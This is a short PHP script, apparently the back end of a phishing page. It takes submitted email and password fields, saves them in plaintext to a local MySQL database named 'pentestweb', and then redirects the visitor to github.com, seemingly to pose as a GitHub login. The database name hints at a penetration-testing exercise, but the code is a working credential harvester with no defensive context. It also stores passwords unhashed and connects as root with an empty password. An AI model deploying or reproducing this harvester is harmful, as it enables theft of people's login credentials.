<?php


var_dump(value: $_SERVER["REQUEST_METHOD"]);
print_r(value: $_POST);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if ($_POST["email"] != "" AND $_POST["pass"] != "") {


        $conn = new PDO(dsn: "mysql:host=localhost;dbname=pentestweb", username: 'root', password: '');

        $conn->setAttribute(attribute: PDO::ATTR_ERRMODE, value: PDO::ERRMODE_EXCEPTION);
        echo "Connected sucessfully";
        $stmt = $conn->prepare(query: ' INSERT INTO tb_usuario(LOGIN_US,SENHA_US) VALUES(? , ?) ');
        $stmt->execute(params: array ($_POST["email"], $_POST["pass"]));
        // echo "feito";
        header(header: "Location:https://github.com");
    }else{
        header(header: "Location:/");
    }

}else{
    die("");
}

?>